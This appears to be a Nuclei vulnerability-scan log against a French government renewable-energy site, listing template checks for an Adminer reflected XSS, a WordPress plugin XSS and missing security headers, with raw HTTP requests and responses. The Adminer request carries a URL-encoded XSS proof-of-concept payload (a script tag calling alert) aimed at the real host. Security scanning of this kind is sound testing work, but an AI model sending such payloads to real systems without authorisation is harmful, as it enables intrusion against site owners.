info.name: Adminer reflected XSS via the table parameter
author: daffainfo
info.description: Adminer is open-source database management software. A cross-site scripting vulnerability in Adminer versions 4.6.1 to 4.8.0 affects users of MySQL, MariaDB, PgSQL and SQLite. XSS is in most cases prevented by strict CSP in all modern browsers. The only exception is when Adminer is using a `pdo_` extension to communicate with the database (it is used if the native extensions are not enabled). In browsers without CSP, Adminer versions 4.6.1 to 4.8.0 are affected. The vulnerability is patched in version 4.8.1. As workarounds, one can use a browser supporting strict CSP or enable the native PHP extensions (e.g. `mysqli`) or disable displaying PHP errors (`display_errors`).

request:
GET /?server=db&username=root&db=mysql&table=event%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E HTTP/1.1
Host: potentiel.beta.gouv.fr
User-Agent: Nuclei - Open-source project (github.com/projectdiscovery/nuclei)
Connection: close
Accept: */*
Accept-Language: en
Accept-Encoding: gzip
response:
HTTP/1.1 200 OK Content-Length: 12642 Content-Security-Policy: default-src 'self' metabase.potentiel.beta.gouv.fr;connect-src 'self' 'unsafe-inline' analytics.potentiel.beta.gouv.fr;img-src 'self' data:;font-src 'self' data:;style-src 'self' data: 'unsafe-inline';script-src 'unsafe-inline' 'self' metabase.potentiel.beta.gouv.fr analytics.potentiel.beta.gouv.fr;object-src 'none' Content-Type: text/html; charset=utf-8 Cross-Origin-Opener-Policy: same-origin Cross-Origin-Resource-Policy: same-origin Date: Thu, 05 May 2022 02:56:56 GMT Etag: W/"3162-dvvv+LH6lBelKoHJ5IxGrMc0Ct8" Expect-Ct: max-age=0 Keep-Alive: timeout=5 Origin-Agent-Cluster: ?1 Referrer-Policy: strict-origin Sozu-Id: 01G292CA7D7HMY134NJ2ABPW06 Strict-Transport-Security: max-age=63072000; preload X-Content-Type-Options: nosniff X-Dns-Prefetch-Control: off X-Download-Options: noopen X-Frame-Options: SAMEORIGIN X-Permitted-Cross-Domain-Policies: none X-Xss-Protection: 0 Potentiel - Suivi des Projets d'Energies Renouvelables

info.name: Frontend Uploader <= 0.9.2 - Unauthenticated Cross-Site Scripting
author: daffainfo
info.description: The Frontend Uploader WordPress plugin prior to v.0.9.2 was affected by an unauthenticated Cross-Site Scripting security vulnerability.

info.name: HTTP Missing Security Headers
author: socketz
geeknik
g4l1t0
convisoappsec
kurohost
dawid-czarnecki
info.description: It searches for missing security headers, but obviously, could be so less generic and could be useless for Bug Bounty.

request:
GET / HTTP/1.1
Host: potentiel.beta.gouv.fr
User-Agent: Nuclei - Open-source project (github.com/projectdiscovery/nuclei)
Connection: close
Accept: */*
Accept-Language: en
Accept-Encoding: gzip
response:
HTTP/1.1 200 OK Content-Length: 12534 Content-Security-Policy: default-src 'self' metabase.potentiel.beta.gouv.fr;connect-src 'self' 'unsafe-inline' analytics.potentiel.beta.gouv.fr;img-src 'self' data:;font-src 'self' data:;style-src 'self' data: 'unsafe-inline';script-src 'unsafe-inline' 'self' metabase.potentiel.beta.gouv.fr analytics.potentiel.beta.gouv.fr;object-src 'none' Content-Type: text/html; charset=utf-8 Cross-Origin-Opener-Policy: same-origin Cross-Origin-Resource-Policy: same-origin Date: Thu, 05 May 2022 02:57:03 GMT Etag: W/"30f6-3X8vD1Mq5SnjaPd1TS1vtk7Qak4" Expect-Ct: max-age=0 Keep-Alive: timeout=5 Origin-Agent-Cluster: ?1 Referrer-Policy: strict-origin Sozu-Id: 01G292CH6Y06R8CN1G8THFWN33 Strict-Transport-Security: max-age=63072000; preload X-Content-Type-Options: nosniff X-Dns-Prefetch-Control: off X-Download-Options: noopen X-Frame-Options: SAMEORIGIN X-Permitted-Cross-Domain-Policies: none X-Xss-Protection: 0 Potentiel - Suivi des Projets d'Energies Renouvelables
République
Française
Potentiel
Facilite le parcours des producteurs
d'énergies renouvelables électriques
  • M'identifier
  • Aide

Suivez efficacement vos projets EnR*, transmettez vos documents, demandez des modifications.
*Énergies renouvelables

Potentiel est le service du Ministère de la Transition Écologique qui connecte
les acteurs du parcours administratif des projets d'EnR soumis à appel d'offres en France
